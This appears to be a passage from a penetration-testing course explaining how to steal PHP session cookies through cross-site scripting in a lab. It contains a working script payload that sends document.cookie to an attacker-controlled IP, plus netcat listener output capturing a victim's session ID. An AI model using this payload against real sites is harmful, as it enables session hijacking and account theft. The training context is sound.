    # 13.2.2 - Stealing Cookies and Session Information


    The vulnerable application used in this section uses an insecure implementation
    of sessions. Once a legitimate user logs into the application, a cookie that contains
    a PHP session ID is added to their. Any further attempts to access this page by
    the authenticated user does not require re-authentication, as their session has
    already been authenticated. Using JavaScript, you can have the victim''s browser
    send the cookie information stored in their browser for session. Our JavaScript
    would look similar to the following:


    ```

    <script>

    new Image().src="http://192.168.10.5/bogus.php?output="+document.cookie;

    </script>

    ```


    The browser of an unsuspecting victim browsing the affected page makes a connection
    back to us with an authenticated session ID value:


    ```

    root@kali:~# nc -nlvp 80

    listening on [any] 80 ...

    connect to [192.168.10.5] from (UNKNOWN) [192.168.11.35] 49455

    GET /bogus.php?output=PHPSESSID=308f5677ie83388c1c9069116054e8oe HTTP/1.1

    Accept: *

    Referer: http://127.0.0.1/index.php

    Accept-Language: en-US

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;

    SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729)

    Accept-Encoding: gzip, deflate

    Host: 192.168.10.5

    Connection: Keep-Alive

    ```'
